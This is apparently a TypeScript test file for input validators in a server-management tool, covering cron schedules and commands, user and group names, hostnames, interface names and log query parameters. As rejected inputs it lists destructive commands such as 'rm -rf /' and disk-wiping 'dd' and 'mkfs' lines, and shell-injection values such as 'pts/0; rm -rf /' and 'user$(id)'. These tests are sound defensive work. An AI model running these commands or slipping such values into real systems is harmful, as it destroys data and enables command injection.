// ---------------------------------------------------------------------------
// M8.5: Cron Validators
// ---------------------------------------------------------------------------

describe('validateCronSchedule', () => {
  it('accepts standard 5-field cron expressions', () => {
    expect(validateCronSchedule('* * * * *')).toBe(true);
    expect(validateCronSchedule('0 * * * *')).toBe(true);
    expect(validateCronSchedule('*/5 * * * *')).toBe(true);
    expect(validateCronSchedule('0 0 * * *')).toBe(true);
    expect(validateCronSchedule('30 2 * * 1')).toBe(true);
    expect(validateCronSchedule('0 0 1 * *')).toBe(true);
    expect(validateCronSchedule('0,15,30,45 * * * *')).toBe(true);
    expect(validateCronSchedule('0 */6 * * *')).toBe(true);
    expect(validateCronSchedule('0 0 1,15 * *')).toBe(true);
  });

  it('accepts special cron strings', () => {
    expect(validateCronSchedule('@reboot')).toBe(true);
    expect(validateCronSchedule('@hourly')).toBe(true);
    expect(validateCronSchedule('@daily')).toBe(true);
    expect(validateCronSchedule('@weekly')).toBe(true);
    expect(validateCronSchedule('@monthly')).toBe(true);
    expect(validateCronSchedule('@yearly')).toBe(true);
    expect(validateCronSchedule('@annually')).toBe(true);
  });

  it('rejects invalid schedules', () => {
    expect(validateCronSchedule('')).toBe(false);
    expect(validateCronSchedule('not a schedule')).toBe(false);
    expect(validateCronSchedule('* *')).toBe(false);
    expect(validateCronSchedule('* * * * * *')).toBe(false);
    expect(validateCronSchedule('@unknown')).toBe(false);
  });

  it('rejects non-string input', () => {
    // @ts-expect-error — testing runtime safety
    expect(validateCronSchedule(null)).toBe(false);
    // @ts-expect-error — testing runtime safety
    expect(validateCronSchedule(undefined)).toBe(false);
  });
});

describe('validateCronCommand', () => {
  it('accepts valid cron commands', () => {
    expect(validateCronCommand('/usr/bin/backup.sh')).toBe(true);
    expect(validateCronCommand('echo "hello"')).toBe(true);
    expect(validateCronCommand('/opt/scripts/cleanup.sh --flag')).toBe(true);
    expect(validateCronCommand('python3 /home/user/task.py')).toBe(true);
    expect(validateCronCommand('curl -s https://example.com/health')).toBe(true);
  });

  it('rejects dangerous commands', () => {
    expect(validateCronCommand('rm -rf /')).toBe(false);
    expect(validateCronCommand('mkfs.ext4 /dev/sda')).toBe(false);
    expect(validateCronCommand('dd if=/dev/zero of=/dev/sda')).toBe(false);
    expect(validateCronCommand('shutdown -h now')).toBe(false);
    expect(validateCronCommand('reboot')).toBe(false);
  });

  it('rejects empty and overly long commands', () => {
    expect(validateCronCommand('')).toBe(false);
    expect(validateCronCommand('   ')).toBe(false);
    expect(validateCronCommand('a'.repeat(1025))).toBe(false);
    expect(validateCronCommand('a'.repeat(1024))).toBe(true);
  });

  it('rejects non-string input', () => {
    // @ts-expect-error — testing runtime safety
    expect(validateCronCommand(null)).toBe(false);
    // @ts-expect-error — testing runtime safety
    expect(validateCronCommand(undefined)).toBe(false);
  });
});

describe('validateCronIndex', () => {
  it('accepts valid indices', () => {
    expect(validateCronIndex(0)).toBe(true);
    expect(validateCronIndex(1)).toBe(true);
    expect(validateCronIndex(10)).toBe(true);
    expect(validateCronIndex(999)).toBe(true);
  });

  it('rejects negative indices', () => {
    expect(validateCronIndex(-1)).toBe(false);
    expect(validateCronIndex(-100)).toBe(false);
  });

  it('rejects indices >= 1000', () => {
    expect(validateCronIndex(1000)).toBe(false);
    expect(validateCronIndex(9999)).toBe(false);
  });

  it('rejects non-integers', () => {
    expect(validateCronIndex(1.5)).toBe(false);
    expect(validateCronIndex(NaN)).toBe(false);
    expect(validateCronIndex(Infinity)).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// M8.6: User & Session Validators
// ---------------------------------------------------------------------------

describe('validateUsername', () => {
  it('accepts valid Linux usernames', () => {
    expect(validateUsername('testuser')).toBe(true);
    expect(validateUsername('_service')).toBe(true);
    expect(validateUsername('user-name')).toBe(true);
    expect(validateUsername('user_name')).toBe(true);
    expect(validateUsername('a')).toBe(true);
    expect(validateUsername('user123')).toBe(true);
  });

  it('rejects invalid usernames', () => {
    expect(validateUsername('')).toBe(false);
    expect(validateUsername('Root')).toBe(false);  // uppercase
    expect(validateUsername('123start')).toBe(false);  // starts with number
    expect(validateUsername('-dash')).toBe(false);  // starts with dash
    expect(validateUsername('user name')).toBe(false);  // space
    expect(validateUsername('user;cmd')).toBe(false);
    expect(validateUsername('user$(id)')).toBe(false);
    expect(validateUsername('a'.repeat(33))).toBe(false);  // too long
  });

  it('rejects non-string input', () => {
    // @ts-expect-error — testing runtime safety
    expect(validateUsername(null)).toBe(false);
    // @ts-expect-error — testing runtime safety
    expect(validateUsername(undefined)).toBe(false);
  });
});

describe('validateTty', () => {
  it('accepts valid TTY names', () => {
    expect(validateTty('pts/0')).toBe(true);
    expect(validateTty('pts/1')).toBe(true);
    expect(validateTty('tty1')).toBe(true);
    expect(validateTty('console')).toBe(true);
  });

  it('rejects invalid TTY names', () => {
    expect(validateTty('')).toBe(false);
    expect(validateTty('pts/0; rm -rf /')).toBe(false);
    expect(validateTty('pts/0$(id)')).toBe(false);
    expect(validateTty('a'.repeat(33))).toBe(false);
  });

  it('rejects non-string input', () => {
    // @ts-expect-error — testing runtime safety
    expect(validateTty(null)).toBe(false);
  });
});

describe('validateGroupName', () => {
  it('accepts valid group names', () => {
    expect(validateGroupName('sudo')).toBe(true);
    expect(validateGroupName('docker')).toBe(true);
    expect(validateGroupName('www-data')).toBe(true);
    expect(validateGroupName('_ssl-cert')).toBe(true);
  });

  it('rejects invalid group names', () => {
    expect(validateGroupName('')).toBe(false);
    expect(validateGroupName('Group')).toBe(false);  // uppercase
    expect(validateGroupName('123')).toBe(false);  // starts with number
    expect(validateGroupName('group;cmd')).toBe(false);
    expect(validateGroupName('a'.repeat(33))).toBe(false);
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// M8.7: Network Management Validators
// ═══════════════════════════════════════════════════════════════════════════

describe('validateHostname', () => {
  it('accepts valid hostnames', () => {
    expect(validateHostname('my-server')).toBe(true);
    expect(validateHostname('server1')).toBe(true);
    expect(validateHostname('web-01')).toBe(true);
    expect(validateHostname('a')).toBe(true);
    expect(validateHostname('server.example.com')).toBe(true);
    expect(validateHostname('sub.server.example.com')).toBe(true);
    expect(validateHostname('my-host-123')).toBe(true);
  });

  it('rejects empty or non-string input', () => {
    expect(validateHostname('')).toBe(false);
    expect(validateHostname(null as unknown as string)).toBe(false);
    expect(validateHostname(undefined as unknown as string)).toBe(false);
    expect(validateHostname(123 as unknown as string)).toBe(false);
  });

  it('rejects hostnames longer than 253 characters', () => {
    // Each label max 63, total max 253
    const longHostname = 'a'.repeat(254);
    expect(validateHostname(longHostname)).toBe(false);
  });

  it('rejects labels longer than 63 characters', () => {
    const longLabel = 'a'.repeat(64) + '.example.com';
    expect(validateHostname(longLabel)).toBe(false);
  });

  it('rejects labels starting or ending with hyphen', () => {
    expect(validateHostname('-server')).toBe(false);
    expect(validateHostname('server-')).toBe(false);
    expect(validateHostname('my.-bad.com')).toBe(false);
    expect(validateHostname('my.bad-.com')).toBe(false);
  });

  it('rejects hostnames with invalid characters', () => {
    expect(validateHostname('server name')).toBe(false);
    expect(validateHostname('server;cmd')).toBe(false);
    expect(validateHostname('server&rm')).toBe(false);
    expect(validateHostname('server|pipe')).toBe(false);
    expect(validateHostname('server$(cmd)')).toBe(false);
    expect(validateHostname('server`cmd`')).toBe(false);
  });

  it('rejects hostnames with empty labels', () => {
    expect(validateHostname('.example.com')).toBe(false);
    expect(validateHostname('example..com')).toBe(false);
  });
});

describe('validateInterfaceName', () => {
  it('accepts valid interface names', () => {
    expect(validateInterfaceName('eth0')).toBe(true);
    expect(validateInterfaceName('ens3')).toBe(true);
    expect(validateInterfaceName('lo')).toBe(true);
    expect(validateInterfaceName('docker0')).toBe(true);
    expect(validateInterfaceName('wlan0')).toBe(true);
    expect(validateInterfaceName('br-abc123')).toBe(true);
    expect(validateInterfaceName('veth1234567')).toBe(true);
    expect(validateInterfaceName('enp0s3')).toBe(true);
  });

  it('rejects empty or non-string input', () => {
    expect(validateInterfaceName('')).toBe(false);
    expect(validateInterfaceName(null as unknown as string)).toBe(false);
    expect(validateInterfaceName(undefined as unknown as string)).toBe(false);
    expect(validateInterfaceName(123 as unknown as string)).toBe(false);
  });

  it('rejects names longer than 15 characters', () => {
    expect(validateInterfaceName('a'.repeat(16))).toBe(false);
  });

  it('accepts names up to 15 characters', () => {
    expect(validateInterfaceName('a'.repeat(15))).toBe(true);
  });

  it('rejects names with shell injection characters', () => {
    expect(validateInterfaceName('eth0;cmd')).toBe(false);
    expect(validateInterfaceName('eth0&rm')).toBe(false);
    expect(validateInterfaceName('eth0|pipe')).toBe(false);
    expect(validateInterfaceName('eth0$(cmd)')).toBe(false);
    expect(validateInterfaceName('eth0`cmd`')).toBe(false);
    expect(validateInterfaceName('eth0 1')).toBe(false);
  });

  it('rejects names with slashes or special chars', () => {
    expect(validateInterfaceName('eth/0')).toBe(false);
    expect(validateInterfaceName('../etc')).toBe(false);
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// M8.8: Log Enhancement Validators
// ═══════════════════════════════════════════════════════════════════════════

describe('validateLogPriority', () => {
  it('accepts valid priorities 0-7', () => {
    for (let i = 0; i <= 7; i++) {
      expect(validateLogPriority(String(i))).toBe(true);
    }
  });

  it('rejects invalid priorities', () => {
    expect(validateLogPriority('8')).toBe(false);
    expect(validateLogPriority('-1')).toBe(false);
    expect(validateLogPriority('10')).toBe(false);
    expect(validateLogPriority('abc')).toBe(false);
    expect(validateLogPriority('')).toBe(false);
    expect(validateLogPriority(null as unknown as string)).toBe(false);
  });
});

describe('validateGrepPattern', () => {
  it('accepts valid grep patterns', () => {
    expect(validateGrepPattern('error')).toBe(true);
    expect(validateGrepPattern('failed to start')).toBe(true);
    expect(validateGrepPattern('nginx')).toBe(true);
    expect(validateGrepPattern('Connection from 10.0.0.1')).toBe(true);
    expect(validateGrepPattern('OOM killer')).toBe(true);
    expect(validateGrepPattern('kernel:')).toBe(true);
  });

  it('rejects shell injection characters', () => {
    expect(validateGrepPattern('error;rm -rf')).toBe(false);
    expect(validateGrepPattern('test|cmd')).toBe(false);
    expect(validateGrepPattern('test&bg')).toBe(false);
    expect(validateGrepPattern('test`cmd`')).toBe(false);
    expect(validateGrepPattern('test$(cmd)')).toBe(false);
    expect(validateGrepPattern('test\\n')).toBe(false);
  });

  it('rejects empty or too-long patterns', () => {
    expect(validateGrepPattern('')).toBe(false);
    expect(validateGrepPattern('   ')).toBe(false);
    expect(validateGrepPattern('a'.repeat(201))).toBe(false);
    expect(validateGrepPattern(null as unknown as string)).toBe(false);
  });

  it('accepts patterns up to 200 chars', () => {
    expect(validateGrepPattern('a'.repeat(200))).toBe(true);
  });
});

describe('validateDateParam', () => {
  it('accepts ISO date strings', () => {
    expect(validateDateParam('2025-01-15')).toBe(true);
    expect(validateDateParam('2025-01-15T10:30')).toBe(true);
    expect(validateDateParam('2025-01-15T10:30:00')).toBe(true);
  });

  it('accepts relative time strings', () => {
    expect(validateDateParam('today')).toBe(true);
    expect(validateDateParam('yesterday')).toBe(true);
    expect(validateDateParam('1 hour ago')).toBe(true);
    expect(validateDateParam('5 minutes ago')).toBe(true);
    expect(validateDateParam('2 days ago')).toBe(true);
    expect(validateDateParam('1 week ago')).toBe(true);
  });

  it('rejects invalid date strings', () => {
    expect(validateDateParam('')).toBe(false);
    expect(validateDateParam('not-a-date')).toBe(false);
    expect(validateDateParam('last week')).toBe(false);
    expect(validateDateParam(null as unknown as string)).toBe(false);
  });

  it('rejects shell injection', () => {
    expect(validateDateParam('2025-01-15;rm')).toBe(false);
    expect(validateDateParam('today$(cmd)')).toBe(false);
    expect(validateDateParam('yesterday|cmd')).toBe(false);
  });

  it('rejects too-long values', () => {
    expect(validateDateParam('a'.repeat(51))).toBe(false);
  });
});
